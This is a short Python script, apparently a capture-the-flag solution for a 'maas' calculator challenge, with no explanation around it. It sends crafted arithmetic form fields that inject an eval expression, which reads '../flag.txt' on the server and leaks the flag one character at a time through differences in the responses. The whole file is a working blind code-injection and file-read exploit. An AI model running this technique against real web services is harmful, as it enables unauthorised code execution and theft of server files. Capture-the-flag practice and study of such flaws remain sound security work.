import requests



url = "https://maas.rars.win/calculator"
#url = 'http://localhost:5000/calculator'

alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890_-{}'

prefix = 'rarctf{'


for index in range(0, 39):
	for c in alphabet:
		req = "eval(\"1 if (open('../flag.txt','r').read(-1).startswith('" + prefix + c + "')) else 'false'\""

		data = {"mode": "arithmetic", "n1": req, "add": "+", "n2": ")"}
		resp = requests.post(url, data)
		if (resp.text.find("Result") == -1) and (resp.status_code != 500):
			prefix += c
			print(prefix)
			continue